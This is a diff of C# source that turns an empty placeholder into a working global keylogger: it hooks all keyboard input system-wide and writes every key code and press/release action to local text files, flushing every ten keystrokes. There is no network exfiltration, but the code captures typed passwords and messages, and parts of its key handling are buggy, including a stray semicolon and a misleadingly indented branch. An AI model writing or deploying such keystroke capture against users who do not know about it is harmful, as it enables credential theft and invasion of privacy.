@@ -1,15 +1,19 @@
 ﻿using System;
 using System.Diagnostics;
+using System.IO;
 using System.Runtime.InteropServices;
-
+using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace KeyboardExtending {
 
 	#region Consts and Enums
 	public enum KeyAction {
+		SysKeyDown = 0x0104,
+		SysKeyUp = 0x0105,
 		KeyDown = 0x0100,
-		KeyUp = 0x0101
+		KeyUp = 0x0101,
 	}
 	#endregion
 
@@ -26,7 +30,7 @@ namespace KeyboardExtending {
 		public int KeyAction;
 	}
 	#endregion
-
+	
 	public class KeyHooker {
 		#region Constants
 		#region keyActionCodes
@@ -218,22 +222,108 @@ namespace KeyboardExtending {
 		#endregion
 	}
 
-	public class KeyLogger { //TODO: There is no KeyLogger. ;)
+	public class KeyLogger { //TODO: Layouts. There must be a simple way to know what letter should be used for each button!
+		#region Consts
+		public const String DEFAULT_TEXT_PATH = "Log_text.txt";
+		public const String DEFAULT_LOG_PATH = "Log.txt";
+		public const int ACTIONS_TO_FLUSH = 10;
+		#endregion
+
 		#region Serving objects
 		KeyHooker _hooker;
+		StreamWriter _writerLog;
+		StreamWriter _writerText;
+		KeysConverter _converter;
+		#endregion
+
+		#region parameters
+			private string _logFilePath;
+			private string _textFilePath;
 		#endregion
 
 		#region Structing
 		public KeyLogger() {
+			_logFilePath = DEFAULT_LOG_PATH;
+			_textFilePath = DEFAULT_TEXT_PATH;
+
+			Initialize();
+		}
+		public KeyLogger(bool startNow) {
+			_logFilePath = DEFAULT_LOG_PATH;
+			_textFilePath = DEFAULT_TEXT_PATH;
+
+			if(startNow)
+				Initialize();
+		}
+
+		public KeyLogger(string folderPath) {
+			if(!Directory.Exists(folderPath))
+				throw new Exception("Directory '" + folderPath + "' not found!");
+			
+			_logFilePath = folderPath + "\\" + DEFAULT_LOG_PATH;
+			_textFilePath = folderPath + "\\" + DEFAULT_TEXT_PATH;
+			Initialize();
+		}
+		public void Begin() {
+			Initialize();
+		}
+
+		public KeyLogger(string logFilePath, string textFilePath) {
+			if (!Directory.Exists(logFilePath.Remove(logFilePath.LastIndexOf("\\", StringComparison.Ordinal))))
+				throw new Exception("Directory '" + logFilePath + "' not found!");
+			if (!Directory.Exists(textFilePath.Remove(textFilePath.LastIndexOf("\\", StringComparison.Ordinal))))
+				throw new Exception("Directory '" + textFilePath + "' not found!");
+					
+			_logFilePath = logFilePath;
+			_textFilePath = textFilePath;
+			Initialize();
+		}
+
+		private void Initialize() {
+			_writerLog = new StreamWriter(new FileStream(_logFilePath, FileMode.OpenOrCreate), Encoding.Unicode) {
+				AutoFlush = false};
+			_writerText = new StreamWriter(new FileStream(_textFilePath, FileMode.OpenOrCreate), Encoding.Unicode) {
+				AutoFlush = false};
+
 			_hooker = new KeyHooker(false);
-			_hooker.OnKeyAction += _hooker_OnKeyAction;
+			_hooker.OnKeyAction += Hooker_OnKeyAction;
+			_converter = new KeysConverter();
+			_actions = 0;
+			_hooker.Hook();
 		}
 		#endregion
 
-		void _hooker_OnKeyAction(IntPtr hookID, KeyActionArgs e) {
+		#region Handling
+		private int _actions;
+		private void Hooker_OnKeyAction(IntPtr hookID, KeyActionArgs e){
+			_writerLog.WriteLine(e.KeyCode + "; " + e.KeyAction);
 			
+			if (e.KeyCode == Keys.Enter) {
+				if (((KeyAction)e.KeyAction) == KeyAction.KeyDown || ((KeyAction)e.KeyAction) == KeyAction.SysKeyDown);
+					//text = '\n'.ToString();
+			}
+			else {
+				string key = _converter.ConvertToString(e.KeyCode);
+				if (((KeyAction)e.KeyAction) == KeyAction.KeyUp || ((KeyAction)e.KeyAction) == KeyAction.SysKeyUp) {
+					if (e.KeyCode.ToString().Length > 1) {
+						_writerText.Write(" /");
+						_writerText.Write(e.KeyCode);
+					}
+				}
+				else
+					_writerText.Write(" ");
+					_writerText.Write(e.KeyCode);
+			}
+			//_writerText.Write(text);
+			
+			_actions++;
+			if (_actions == ACTIONS_TO_FLUSH) {
+				_writerLog.Flush();
+				_writerText.Flush();
+				_actions = 0;
+			}
 		}
-
+		#endregion
 	}
 
 }
